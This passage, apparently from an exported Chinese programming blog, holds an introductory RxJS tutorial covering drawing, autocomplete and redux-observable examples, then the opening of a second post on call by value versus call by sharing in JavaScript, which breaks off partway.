RxJS 就不會覺得太奇怪了。 Reactive Programming談到 RxJS 的時候，都會談到 Reactive 這個詞，那什麼是 Reactive 呢？可以從英文上的字義來看，這個單字的意思是：「反應、反應性的」，意思就是你要對一些事情做出反應。 所以 Reactive 其實就是在講說：「某些事情發生時，我能夠做出反應」。 讓我們來舉一個大家非常熟知的例子： window.addEventListener('click', function()&#123; console.log('click!'); &#125;) 我們加了一個 event listener 在 window 上面，所以我們可以監聽到這個事件，每當使用者點擊的時候就列印出 log。換句話說，這樣就是：「當 window 被點擊時，我可以做出反應」。 正式進入 RxJS如果你去看 ReactiveX 的網頁，你會發現他有明確的定義 ReactiveX： ReactiveX is a combination of the best ideas fromthe Observer pattern, the Iterator pattern, and functional programming 第一個 Observer pattern 就像是 event listener 那樣，在某些事情發生時，我們可以對其作出反應；第二個 Iterator pattern 我們跳過不講，我認為暫時不影響理解；第三個就像是一開始的例子，我們可以把一個陣列經過多次轉換，轉換成我們想要的資料。 在 Reactive Programming 裡面，最重要的兩個東西叫做 Observable 跟 Observer，其實一開始讓我最困惑的點是因為我英文不好，不知道這兩個到底誰是觀察的誰是被觀察的。 先把它們翻成中文，Observable 就是「可被觀察的」，Observer 就是所謂的「觀察者」。 這是什麼意思呢？就如同上面的例子一樣，當（可被觀察的東西）有事情發生，（Observer，觀察者）就可以做出反應。 直接舉一個例子你就知道了： Rx.Observable.fromEvent(window, 'click') .subscribe(e => &#123; console.log('click~'); &#125;) 上面這段程式碼跟我幫 window 加上 event listener 在做的事情完全一樣，只是這邊我們使用了 RxJS 提供的方法叫做fromEvent，來把一個 event 轉成 Observable（可被觀察的），並且在最後加上 subscribe。 這樣寫就代表說我訂閱了這個 Observable，只要有任何事情發生，就會執行我傳進去的 function。 所以到底什麼是 Observable？ Observable 就是一個可被觀察的對象，這個對象可以是任何東西（例如說上述例子就是 window 的 click 事件），當有新資料的時候（例如說新的點擊事件），你就可以接收到這個新資料的資訊並且做出反應。 比起 Observable 這個冷冰冰的說法，我更喜歡的一個說法是 stream，資料流。其實每一個 Observable 就是一個資料流，但什麼是資料流？你就想像成是會一直增加元素的陣列就好了，有新的事件發生就 push 進去。如果你喜歡更專業一點的說法，可以叫它：「時間序列上的一連串資料事件」（取自 Reactive Programming 簡介與教學(以 RxJS 為例)） 或是我再舉一個例子，stream 的另外一個解釋就是所謂的「串流影片」，意思就是隨著你不斷播放，就會不斷下載新的片段進來。此時你腦中應該要有個畫面，就是像水流那樣，不斷有新的東西流進來，這個東西就叫做 stream。 （圖片取自 giphy） 我理解資料流了，然後呢？上面有說過，我們可以把任何一個東西轉成 Observable，讓它變成資料流，可是這不就跟 addEventListener 一樣嗎？有什麼特別的？ 有，還真的比較特別。 希望你沒有忘記我們剛開始做的那個小練習，就是把一個陣列透過一系列轉換，變成我們要的資料的那個練習。我剛剛有說，你可以把 Observable 想成是「會一直增加元素的陣列」，這代表什麼呢？ 代表我們也可以把 Observable 做一系列的轉換！我們也可以用那些用在陣列上的 function！ Rx.Observable.fromEvent(window, 'click') .map(e => e.target) .subscribe(value => &#123; console.log('click: ', value) &#125;) 我們把 click 事件經過 map 轉換為點擊到的 element，所以當我們最後在 subscribe 的時候，收到的 value 就會是我們點擊的東西。 接著來看一個稍微進階一點的例子： Rx.Observable.fromEvent(window, 'click') .map(e => 1) .scan((total, now) => total + now) .subscribe(value => &#123; document.querySelector('#counter').innerText = value; &#125;) 首先我們先把每一個 click 事件都透過map轉換成 1（或者你也可以寫成.mapTo(1)），所以每按一次就送出一個數字 1。scan的話其實就是我們一開始對陣列用的reduce，你可以想成是換個名字而已。透過scan加總以後傳給 subscriber，顯示在頁面上面。 就這樣簡單幾行，就完成了一個計算點擊次數的 counter。 可以用一個簡單的 gif 圖來表示上面的範例： 可是 Observable 不只這樣而已，接下來我們要進入到它最厲害的地方了。 威力無窮的組合技如果把兩個陣列合併，會變成什麼？例如說[1, 2, 3]跟[4, 5, 6]？ 這要看你指的「合併」是什麼，如果是指串接，那就是[1, 2, 3, 4, 5, 6]，如果是指相加，那就是[5, 7, 9]。 那如果把兩個 Observable 合併會變成什麼？ Observable 跟陣列的差別就在於多了一個維度：時間。 Observable 是「時間序列上的一連串資料事件」，就像我前面講的一樣，可以看成是一個一直會有新資料進來的陣列。 我們先來看看一張很棒的圖，很清楚地解釋了兩個 Observable 合併會變成什麼： （取自：http://rxmarbles.com/#merge） 上面是一個 Observable，每一個圓點代表一個資料，下面也是一樣，把這兩個合併之後就變成最下面那一條，看圖解應該還滿好懂的，就像是把兩個時間軸合併一樣。 讓我們來看一個可以展現合併強大之處的範例，我們有 +1 跟 -1 兩個按鈕以及文字顯示現在的數字是多少： 該怎麼達成這個功能呢？基本的想法就是我們先把每個 +1 的 click 事件都通過mapTo變成數字 1，取叫 Observable_plus1 好了。再做出一個 Observable_minus1 是把每個 -1 的 click 事件都通過mapTo變成數字 -1。 把這兩個 Observable 合併之後，再利用剛剛提到的scan加總，就是目前應該要顯示的數字了！ Rx.Observable.fromEvent(document.querySelector('input[name=plus]'), 'click') .mapTo(1) .merge( Rx.Observable.fromEvent(document.querySelector('input[name=minus]'), 'click') .mapTo(-1) ) .scan((total, now) => total + now) .subscribe(value => &#123; document.querySelector('#counter').innerText = value; &#125;) 如果你還是不懂的話，可以參考下面的精美範例，示範這兩個 Observable 是怎麼合在一起的（O代表點擊事件，+1跟-1則是mapTo之後的結果）： 讓我們來比較一下如果不用 Observable 的話，程式碼會長怎樣： var total = 0; document.querySelector('input[name=plus]').addEventListener('click', () => &#123; total++; document.querySelector('#counter').innerText = total; &#125;) document.querySelector('input[name=minus]').addEventListener('click', () => &#123; total--; document.querySelector('#counter').innerText = total; &#125;) 有沒有發覺兩者真的差別很大？就如同我之前所說的，是兩種完全不同的思考模式，所以 Reactive Programming 困難的地方不是在於理解，也不是在於語法（這兩者相信你目前都有些概念了），而是在於換一種全新的思考模式。 以上面的寫法來說，就是告訴電腦：「按下加的時候就把一個變數 +1，然後更改文字；按下減的時候就 -1 並且也更改文字」，就可以達成計數器的功能。 以 Reactive 的寫法，就是把按下加當成一個資料流，把按下減也當成一個資料流，再透過各種 function 把這兩個流轉換並且合併起來，讓最後的那個流就是我們想要的結果（計數器）。 你現在應該能體會到我一開始說的了：「把原始資料經過一連串的轉換，最後變成你想要的答案」，這點就是 Reactive Programming 最大的特色。 組合技中的組合技我們來看一個更複雜一點的範例，是在 canvas 上面實現非常簡單的繪圖功能，就是滑鼠按下去之後可以畫畫，放開來就停止。 要實現這個功能很間單，canvas 提供lineTo(x, y)這個方法，只要在滑鼠移動時不斷呼叫這個方法，就可以不斷畫出圖形來。但有一點要注意的是當你在按下滑鼠時，應該先呼叫moveTo(x, y)把繪圖的點移到指定位置，為什麼呢？ 假設我們第一次畫圖是在左上角，第二次按下滑鼠的位置是在右下角，如果沒有先用moveTo移動而是直接用lineTo的話，就會多一條線從左上角延伸到右下角。moveTo跟lineTo的差別就是前者只是移動，後者會跟上次的點連接在一起畫成一條線。 var canvas = document.getElementById('canvas'); var ctx = canvas.getContext('2d'); ctx.beginPath(); // 開始畫畫 function draw(e)&#123; ctx.lineTo(e.clientX,e.clientY); // 移到滑鼠在的位置 ctx.stroke(); // 畫畫 &#125; // 按下去滑鼠才開始偵測 mousemove 事件 canvas.addEventListener('mousedown', function(e)&#123; ctx.moveTo(e.clientX, e.clientY); // 每次按下的時候必須要先把繪圖的點移到那邊，否則會受上次畫的位置影響 canvas.addEventListener('mousemove', draw); &#125;) // 放開滑鼠就停止偵測 canvas.addEventListener('mouseup', function(e)&#123; canvas.removeEventListener('mousemove', draw); &#125;) 那如果在 RxJS 裡面，該怎麼實作這個功能呢？ 首先憑直覺，應該就是先加上mousedown的事件對吧！至少有個開頭。 Rx.Observable.fromEvent(canvas, 'mousedown') .subscribe(e => &#123; console.log('mousedown'); &#125;) 可是滑鼠按下去之後應該要變成什麼？這個時候應該要開始監聽mousemove對吧，所以我們這樣寫，用mapTo把每一個mousedown的事件都轉換成mousemove的 Observable： Rx.Observable.fromEvent(canvas, 'mousedown') .mapTo( Rx.Observable.fromEvent(canvas, 'mousemove') ) .subscribe(value => &#123; console.log('value: ', value); &#125;) 接著你看一下 console，你會發現每當我點擊的時候，console 就會印出FromEventObservable &#123;_isScalar: false, sourceObj: canvas#canvas, eventName: &quot;mousemove&quot;, selector: undefined, options: undefined&#125; 仔細想一下你會發現也滿合理的，因為我用mapTo把每一個滑鼠按下去的事件轉成一個 mousemove 的 Observable，所以用 subscribe 訂閱之後拿到的東西就會是這個 Observable。如果畫成圖，大概長得像這樣： 好了，那怎麼辦呢？我想要的其實不是 Observable 本身，而是屬於這個 Observable 裡面的那些東西啊！現在這個情形就是 Observable 裡面又有 Observable，有兩層，可是我想要讓它變成一層就好，該怎麼辦呢？ 在此提供一個讓 Observable 變簡單的訣竅： 只要有問題，先想想 Array 就對了！ 我前面有提過，可以把 Observable 看成是加上時間維度的進階版陣列，因此只要是陣列有的方法，Observable 通常也都會有。 舉例來說，一個陣列可能長這樣：[1, [2, 2.5], 3, [4, 5]]一共有兩層，第二層也是一個陣列。 如果想讓它變一層的話怎麼辦呢？壓平！ 有用過 lodash 或是其他類似的 library 的話，你應該有聽過_.flatten這個方法，可以把這種陣列壓平，變成：[1, 2, 2.5, 3, 4, 5]。 用 flat 這個關鍵字去搜尋 Rx 文件的話，你會找到一個方法叫做 FlatMap，簡單來說就是先map之後再自動幫你壓平。 所以，我們可以把程式碼改成這樣： Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove')) .subscribe(e => &#123; console.log(e); &#125;) 當你點擊之後，會發現隨著滑鼠移動，console 會印出一大堆 log，就代表我們成功了。 畫成示意圖的話會變成這樣（為了方便說明，我把flatMap在圖片上變成map跟flatten兩個步驟）： 接下來呢？接下來我們要讓它可以在滑鼠鬆開的時候停止，該怎麼做呢？RxJS 有一個方法叫做takeUntil，意思就是拿到…發生為止，傳進去的參數必須是一個 Observable。 舉例來說，如果寫.takeUntil(window, &#39;click&#39;)，就表示如果任何window的點擊事件發生，這個 Observable 就會立刻終止，不會再送出任何資料。 應用在繪畫的例子上，我們只要把takeUntil後面傳的參數換成滑鼠鬆開就好！順便把subscribe跟畫畫的 function 也一起完成吧！ Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove')) .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) .subscribe(e => &#123; draw(e); &#125;) 改完之後馬上來實驗一下！滑鼠按下去之後順利開始畫圖，鬆開以後畫圖停止，完美！ 咦，可是怎麼按下第二次就沒反應了？我們做出了一個「只能夠成功畫一次圖」的 Observable。 為什麼呢？我們可以先來看一下takeUntil的示意圖（取自：http://rxmarbles.com/#takeUntil） 以我們的情形來說，就是只要mouseup事件發生，「整個 Observable」就會停止，所以只有第一次能夠畫圖成功。但我們想要的其實不是這樣，我們想要的是只有mousemove停止而已，而不是整個都停止。 所以，我們應該把takeUntil放在mousemove的後面，也就是： Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e => &#123; draw(e); &#125;) 這樣子裡面的那個mousemove的 Observable 就會在滑鼠鬆開時停止發送事件，而我們最外層的這個 Observable 監聽的是滑鼠按下，會一直監聽下去。 到這邊其實就差不多了，但還有一個小 bug 要修，就是我們沒有在mousedown的時候利用moveTo移動，造成我們一開始說的那個會把上次畫的跟這次畫的連在一起的問題。 那怎麼辦呢？我已經把mousedown事件轉成其他資料流了，我要怎麼在mousedown的時候做事？ 有一個方法叫做do，就是為了這種情形而設立的，使用時機是：「你想做一點事，卻又不想影響資料流」，有點像是能夠針對不同階段 subscribe 的感覺，mousedown的時候 subscribe 一次，最後要畫圖的時候又 subscribe 一次。 Rx.Observable.fromEvent(canvas, 'mousedown') .do(e => &#123; ctx.moveTo(e.clientX, e.clientY) &#125;) .flatMap(e => Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e => &#123; draw(e); &#125;) 到這邊，我們就順利完成了畫圖的功能。 如果你想試試看你有沒有搞懂，可以實作看看拖拉移動物體的功能，原理跟這個很類似，都是偵測滑鼠的事件並且做出反應。 喝口水休息一下，下半場要開始了上半場的目標在於讓你理解什麼是 Rx，並且掌握幾個基本概念： 一個資料流可以經過一系列轉換，變成另一個資料流 這些轉換基本上都跟陣列有的差不多，像是map、filter、flatten等等 你可以合併多個 Observable，也可以把二維的 Observable 壓平 下半場專注的點則是在於實戰應用，並且圍繞著 RxJS 最適合的場景之一：API。 前面我們有提到說可以把 DOM 物件的 event 變成資料流，但除了這個以外，Promise 其實也可以變成資料流。概念其實也很簡單啦，就是 Promise 被 resovle 的時候就發送一個資料，被 reject 的時候就終止。 讓我們來看一個簡單的小範例，每按一次按鈕就會發送一個 request function sendRequest () &#123; return fetch('https://jsonplaceholder.typicode.com/posts/1').then(res => res.json()) &#125; Rx.Observable.fromEvent(document.querySelector('input[name=send]'), 'click') .flatMap(e => Rx.Observable.fromPromise(sendRequest())) .subscribe(value => &#123; console.log(value) &#125;) 這邊用flatMap的原因跟剛才的畫圖範例一樣，我們要在按下按鈕時，把原本的資料流轉換成新的資料流，如果只用map的話，會變成一個二維的 Observable，所以必須要用flatten把它壓平。 你可以試試看把flatMap改成map，你最後 subscribe 得到的值就會是一堆 Observable 而不是你想要的資料。 知道怎麼用 Rx 來處理 API 之後，就可以來做一個經典範例了：AutoComplete。 我在做這個範例的時候有極大部分參考30 天精通 RxJS(19): 實務範例 - 簡易 Auto Complete 實作、Reactive Programming 簡介與教學(以 RxJS 為例)以及构建流式应用—RxJS详解，再次感謝這三篇文章。 為了要讓大家能夠體會 Reactive Programming 跟一般的有什麼不一樣，我們先用老方法做出這個 Auto Complete 的功能吧！ 先來寫一下最底層的兩個函式，負責抓資料的以及 render 建議清單的，我們使用維基百科的 API 來當作範例： function searchWikipedia (term) &#123; return $.ajax(&#123; url: 'http://en.wikipedia.org/w/api.php', dataType: 'jsonp', data: &#123; action: 'opensearch', format: 'json', search: term &#125; &#125;).promise(); &#125; function renderList (list) &#123; $('.auto-complete__list').empty(); $('.auto-complete__list').append(list.map(item => '&lt;li>' + item + '&lt;/li>')) &#125; 這邊要注意的一個點是維基百科回傳的資料會是一個陣列，格式如下： [你輸入的關鍵字, 關鍵字清單, 每個關鍵字的介紹, 每個關鍵字的連結] &#x2F;&#x2F; 範例： [ &quot;dd&quot;, [&quot;Dd&quot;, &quot;DDR3 SDRAM&quot;, &quot;DD tank&quot;], [&quot;&quot;, &quot;Double data rate type three SDRAM (DDR3 SDRAM)&quot;, &quot;DD or Duplex Drive tanks&quot;], [https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Dd&quot;, &quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;DDR3_SDRAM&quot;, &quot;...略&quot;] ] 在我們的簡單示範中，只需要取 index 為 1 的那個關鍵字清單就好了。而renderList這個 function 則是傳進一個陣列，就會把陣列內容轉成li顯示出來。 有了這兩個最基礎的 function 之後，就可以很輕易地完成 Auto Complete 的功能： document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; searchWikipedia(e.target.value).then((data) => &#123; renderList(data[1]) &#125;) &#125;) 程式碼應該很好懂，就是每次按下輸入東西的時候去 call api，把回傳的資料餵給renderList去渲染。 最基本的功能完成了，我們要來做一點優化，因為這樣子的實作其實是有一些問題的。 第一個問題，現在只要每打一個字就會送出一個 request，可是這樣做其實有點浪費，因為使用者可能快速的輸入了：java想要找相關的資料，他根本不在乎j、ja、jav這三個 request。 要怎麼做呢？我們就改寫成如果 250ms 裡面沒有再輸入新的東西才發送 request 就好，就可以避免這種多餘的浪費。 這種技巧稱作debounce，實作上也很簡單，就是利用setTimeout跟clearTimeout。 var timer = null; document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() => &#123; searchWikipedia(e.target.value).then((data) => &#123; renderList(data[1]) &#125;) &#125;, 250) &#125;) 在 input 事件被觸發之後，我們不直接做事情，而是設置了一個 250ms 過後會觸發的 timer，如果 250ms 內 input 再次被觸發的話，我們就把上次的 timer 清掉，再重新設置一個。 如此一來，就可以保證使用者如果在短時間內不斷輸入文字的話，不會送出相對應的 request，而是會等到最後一個字打完之後的 250 ms 才發出 request。 解決了第一個問題之後，還有一個潛在的問題需要解決。 假設我現在輸入a，接著刪除然後再輸入b，所以第一個 request 會是a的結果，第二個 request 會是b的結果。我們假設 server 出了一點問題，所以第二個的 response 反而比第一個還先到達（可能b的搜尋結果有 cache 但是a沒有），這時候就會先顯示b的內容，等到第一個 response 回來時，再顯示a的內容。 可是這樣 UI 就有問題了，我明明輸入的是b，怎麼 auto complete 的推薦關鍵字是a開頭？ 所以我們必須要做個檢查，檢查返回的資料跟我現在輸入的資料是不是一致，如果一致的話才 render： var timer = null; document.querySelector('.auto-complete input').addEventListener('input', (e) => &#123; if (timer) &#123; clearTimeout(timer); &#125; timer = setTimeout(() => &#123; searchWikipedia(e.target.value).then((data) => &#123; if (data[0] === document.querySelector('.auto-complete input').value) &#123; renderList(data[1]) &#125; &#125;) &#125;, 250) &#125;) 到這裡應該就差不多了，該有的功能都有了。 接著，讓我們來挑戰用 RxJS 實作吧！ 首先，先從簡單版的開始做，就是不包含 debounce 跟上面 API 順序問題的實作，監聽 input 事件轉換成 request，然後用flatMap壓平，其實就跟上面的流程差不多： Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .map(e => e.target.value) .flatMap(value => &#123; return Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) 這邊用了兩個map，一個是把e轉成e.target.value，一個是把傳回來的結果轉成res[1]，因為我們只需要關鍵字列表，其他的東西其實都不用。 那要如何實作debounce的功能呢？ RxJS 已經幫你實作好了，所以你只要加上.debounceTime(250)就好了，就是這麼簡單。 Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e => e.target.value) .flatMap(value => &#123; return Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) 還有最後一個問題要解決，那就是剛才提到的 request 的順序問題。 Observable 有一個不同的解法，我來解釋給大家聽聽。 其實除了flatMap以外，還有另外一種方式叫做switchMap，他們的差別在於要怎麼把 Observable 給壓平。前者我們之前介紹過了，就是會把每一個二維的 Observable 都壓平，並且「每一個都執行」。 而switchMap的差別在於，他永遠只會處理最後一個 Observable。拿我們的例子來說，假設第一個 request 還沒回來的時候，第二個 request 就發出去了，那我們的 Observable 就只會處理第二個 request，而不管第一個。 第一個還是會發送，還是會接收到資料，只是接收到資料以後不會再把這個資料 emit 到 Observable 上面，意思就是根本沒人理這個資料了。 可以看一下簡陋的圖解，flatMap每一個 promise resolve 之後的資料都會被發送到我們的 Observable 上面： 而switchMap只會處理最後一個： 所以我們只要把flatMap改成switchMap，就可以永遠只關注最後一個發送的 request，不用去管 request 傳回來的順序，因為前面的 request 都跟這個 Observable 無關了。 Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e => e.target.value) .switchMap(value => &#123; return Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) 做到這邊，就跟剛剛實作的功能一模一樣了。 但其實還有地方可以改進，我們來做個小小的加強好了。現在的話當我輸入abc，會出現abc的相關關鍵字，接著我把abc全部刪掉，讓 input 變成空白，會發現 API 這時候回傳一個錯誤：The &quot;search&quot; parameter must be set.。 因此，我們可以在 input 是空的時候，不發送 request，只回傳一個空陣列，而回傳空陣列這件事情可以用Rx.Observable.of([])來完成，這樣會創造一個會發送空陣列的 Observable： Rx.Observable .fromEvent(document.querySelector('.auto-complete input'), 'input') .debounceTime(250) .map(e => e.target.value) .switchMap(value => &#123; return value.length &lt; 1 ? Rx.Observable.of([]) : Rx.Observable.from(searchWikipedia(value)).map(res => res[1]) &#125;) .subscribe(value => &#123; renderList(value); &#125;) 還有一個點擊關鍵字清單之後把文字設定成關鍵字的功能，在這邊就不示範給大家看了，但其實就是再創造一個 Observable 去監聽點擊事件，點到的時候就設定文字並且把關鍵字清單給清掉。 我直接附上參考程式碼： Rx.Observable .fromEvent(document.querySelector('.auto-complete__list'), 'click') .filter(e => e.target.matches('li')) .map(e => e.target.innerHTML) .subscribe(value => &#123; document.querySelector('.auto-complete input').value = value; renderList([]) &#125;) 雖然我只介紹了最基本的操作，但 RxJS 的強大之處就在於除了這些，你甚至還有retry可以用，只要輕鬆加上這個，就能夠有自動重試的功能。 相關的應用場景還有很多，只要是跟 API 有關連的幾乎都可以用 RxJS 很優雅的解決。 React + Redux 的非同步解決方案：redux-observable這是我們今天的最後一個主題了，也是我開場所提到的。 React + Redux 這一套非常常見的組合，一直都有一個問題存在，那就是沒有規範非同步行為（例如說 API）到底應該怎麼處理。而開源社群也有許多不同的解決方案，例如說 redux-thunk、redux-promise、redux-saga 等等。 我們前面講了這麼多東西，舉了這麼多範例，就是要證明給大家看 Reactive programming 很適合拿來解決複雜的非同步問題。因此，Netflix 就開源了這套redux-observable，用 RxJS 來處理非同步行為。 在瞭解 RxJS 之後，可以很輕鬆的理解redux-observable的原理。 在 redux 的應用裡面，所有的 action 都會通過 middleware，你可以在這邊對 action 做任何處理。或者我們也可以把 action 看做是一個 Observable，例如說： // 範例而已 Rx.Observable.from(actionStreams) .subscribe(action => &#123; console.log(action.type, action.payload) &#125;) 有了這個以後，我們就可以做一些很有趣的事情，例如說偵測到某個 action 的時候，我們就發送 request，並且把 response 放進另外一個 action 裡面送出去。 Rx.Observable.from(actionStreams) .filter(action => action.type === 'GET_USER_INFO') .switchMap( action => Rx.Observable.from(API.getUserInfo(action.payload.userId)) ) .subscribe(userInfo => &#123; dispatch(&#123; type: 'SET_USER_INFO', payload: userInfo &#125;) &#125;) 上面就是一個簡單的例子，但其實redux-observable已經幫我們處理掉很多東西了，所以我們只要記得一個概念： action in, action out redux-observable 是一個 middleware，你可以在裡面加上很多epic，每一個epic就是一個 Observable，你可以監聽某一個指定的 action，做一些處理，再轉成另外一個 action。 直接看程式碼會比較好懂： import Actions from './actions/user'; import ActionTypes from './actionTypes/user' const getUserEpic = action$ => action$.ofType(actionTypes.GET_USER) .switchMap( action => Rx.Observable.from(API.getUserInfo(action.payload.userId)) ).map(userInfo => Actions.setUsers(userInfo)) 大概就是像這樣，我們監聽一個 action type（GET_USER），一接收到的時候就發送 request，並且把結果轉為setUsers這個 action，這就是所謂的 action in, action out。 這樣的好處是什麼？好處是明確制定了一個規範，當你的 component 需要資料的時候，就送出一個 get 的 action，這個 action 經過 middleware 的時候會觸發 epic，epic 發 request 給 server 拿資料，轉成另外一個 set 的 action，經過 reducer 設定資料以後更新到 component 的 props。 可以看這張流程圖： 總之呢，epic就是一個 Observable，你只要確保你最後回傳的東西是一個 action 就好，那個 action 就會被送到 reducer 去。 礙於篇幅的關係，今天對於redux-observable只是概念性的帶過去而已，沒有時間好好示範，之後再來找個時間好好寫一下redux-observable的實戰應用。 結論從一開始的陣列講到 Observable，講到畫圖的範例再講到經典的 Auto Complete，最後還講了redux-observable，這一路的過程中，希望大家有體會到 Observable 在處理非同步行為的強大之處以及簡潔。 這篇的目的是希望能讓大家理解 Observable 大概在做什麼，以及介紹一些簡單的應用場景，希望能提供一篇簡單易懂的中文入門文章，讓更多人能體會到 Observable 的威力。 喜歡這篇的話可以幫忙分享出去，發現哪邊有寫錯也歡迎留言指正，感謝。 參考資料： 30 天精通 RxJS (01)：認識 RxJSReactive Programming 簡介與教學(以 RxJS 為例)The introduction to Reactive Programming you’ve been missing构建流式应用—RxJS详解Epic Middleware in ReduxCombining multiple Http streams with RxJS Observables in Angular2 影片：Netflix JavaScript Talks - RxJS + Redux + React &#x3D; Amazing!RxJS Quick Start with Practical ExamplesRxJS Observables Crash CourseNetflix JavaScript Talks - RxJS Version 5RxJS 5 Thinking Reactively | Ben Lesh","link":"/2017/12/08/introduction-to-rxjs-observable/"},{"title":"深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？","text":"前言其實這週原本是要來寫淺拷貝跟深拷貝的差異以及實作，但在找資料的時候無意間又看到 call by value 與 call by reference 相關的文章，越研究發現越有趣。原本以為自己已經搞懂了這個問題，但沒想到看的資料越多，卻把自己弄的越糊塗。 要寫這篇文章其實有兩個不同的方式，一個是詳實記錄我研究這個問題的過程以及心中的疑惑，以及最後如何得到解答，簡單來說就是按照時間軸來寫；另外一個是當我研究完以後，再重新以自己的方式整理，並且用更簡單易懂的方式來表達。 以往我的文章大多數都走第二種路線，重新歸納整理過後再寫出一篇相對上更容易理解的文章，用我的方式帶著大家一步步跟著我的脈絡去探討問題最後得出解答。 但這次我想嘗試第一種，帶大家看看我平常寫文章的時候都看了哪些資料，以及發想的過程為何，這樣應該也滿有趣的。 Let’s go! 美麗的錯誤開頭有講過了，我會再重新回來研究參數傳遞這個問題完全是個美麗的錯誤，我本來要寫的主題是深拷貝跟淺拷貝。 在找資料的時候，我查到了這篇文：[Javascript] 關於 JS 中的淺拷貝和深拷貝 ，我看了看之後發現如果我要來講深拷貝，我就必須先講解為什麼我們需要深拷貝，就要講到 Object 跟其他 Primitive types 的不同之處。 想到這邊，我就想到了一個老問題：JavaScript 的 Object 到底是 pass by value 還是 pass by referece？ 我依稀記得答案是前者，或者兩者都不是，而是有個新的名詞叫作 pass by sharing。 為了驗證自己的印象沒錯，我繼續動手搜尋，最後找到了[筆記] 談談JavaScript中by reference和by value的重要觀念以及重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？，後者我有印象我看過，而且驗證了我的印象是正確的。 好，話說到這裡，必須先跟大家介紹一下這三者以及之間的差異，否則沒辦法繼續往下講。 Function 的參數傳遞方式先來一個很簡單的範例： function swap(a, b) &#123; var temp = a; a = b; b = temp; &#125; var x = 10; var y = 20; swap(x, y); console.log(x, y) // 10, 20 當你執行完swap之後，x跟y的值並沒有交換，為什麼？因為你傳進去的東西「不是真的 x 跟 y」，而是「x 跟 y 的值的拷貝」。 也就是說a跟b其實就是另外兩個新的變數，然後存的值跟x和y一樣，但你改變了a不會改變x，因為他們是兩個不同的變數。 可以參考下面的精美小動畫： 上面這種方式就叫做：call by value（或是 pass by value），在呼叫 function 的時候把「值」給複製一份。 到這邊應該還滿好懂的，接下來要開始慢慢進入到複雜的部分了。有另外一種方法，叫做 call by reference，意思是「你傳進去的東西就是真的 x 跟 y，function 裡面的 a 跟 b 只是別名（alias）而已，改變 a 就會改變 x」 很顯然的，在 JavaScript 裡面對於像數字這種的 Primitive type，是沒有 call by reference 的，因為你絕對不可能透過 function 內的引數去改變 function 外面的變數。 對於數字不可能，那對 object 呢？ function add(obj) &#123; obj.number++ &#125; var o = &#123;number: 10&#125; add(o) console.log(o.number) // 11 哪泥！居然在 function 裡面成功改變外面的東西了！難道這就是 call by reference 嗎？ 先別急，乍看之下很像，可是有一個操作會露出破綻： function add(obj) &#123; // 讓 obj 變成一個新的 object obj = &#123; number: obj.number + 1 &#125; &#125; var o = &#123;number: 10&#125; add(o) console.log(o.number) // 10 如果是真的 call by reference，那你在 function 裡面把 obj 的值改掉了，外面的 o 也會一起被改掉，變成那個新的 object，可是從上面這段範例看起來並沒有，所以這樣做不是 call by reference。 既不是 call by value 也不是 call by reference，那這樣應該叫做什麼呢？ 有人把這種方式叫做 call by sharing，意思就是我們讓 function 裡面的那個obj跟外面的o「共享」同一個 object，所以透過裡面的 obj，你可以去修改「共享到的那個 object」的資料。 上面都跟 call by reference 看起來沒兩樣，但最大的差異是如果你在 function 裡面把 obj 重新賦值，就代表你要讓這個 obj 指向一個新的 object，所以外面的 o 依舊還是原來的值。 引入了一個新名詞之後，看起來所有問題都得到了解答，結論就是：「在 JavaScript，primitive types 是 call by value，object 是 call by sharing」 不過，這一切只是我天真的想法而已，某天我看到一句話… JavaScript 只有 call by value這句話乍看之下完全沒道理，剛剛不是說是 call by sharing 嗎？怎麼又變成 call by value 了？ 但其實這句話是要這樣解讀的： 當你在宣告一個 object 的時候，在底層實作上，其實這個 object 存的是一個記憶體位置，或如果用 C 的方式來講，object 的底層就是一個指標。 先幫大家複習一下指標，你可以把指標看成是變數型態的一種，差別在於它所儲存的值是「記憶體位置」。 o 這個變數的值是什麼？ 這個問題的答案是我認為理解「JavaScript 只有 call by value」這句話的關鍵。 如果從上層來看，答案理所當然會是：「o 的值是 {number: 10}」。可是如果你從底層實作的角度來看，答案就會是：「o 的值是 0x01」 我們用第二個答案繼續往下講，假設 o 的值是 0x01 的話，那你在呼叫 function 的時候，傳進去的值其實就是 0x01，所以在 function 裡面的變數才可以透過這個記憶體位置去操作同樣的東西。 就是我們前面那張圖畫的，o 跟 obj 兩個變數會「指向」同一個地方。而底層實作原理就是把 o 的記憶體位置傳給 obj 嘛，不然怎麼能指向同個地方。 如果以這個角度來看，call by sharing（傳記憶體位置進去）其實就是 call by value 的一種，解釋的方式為：其實一樣是傳值的拷貝進去，只是這個值是記憶體位置。 乍聽之下有點道理，可是有個點我怎麼想都想不通： 如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？ 因為以底層來看，call by reference 一樣也是傳記憶體位置進去啊，那不就全世界都只有 call by value？ 後來我查到了一篇文章跟我有類似的想法：Re: [問題] 請問傳參考到底是什麼? 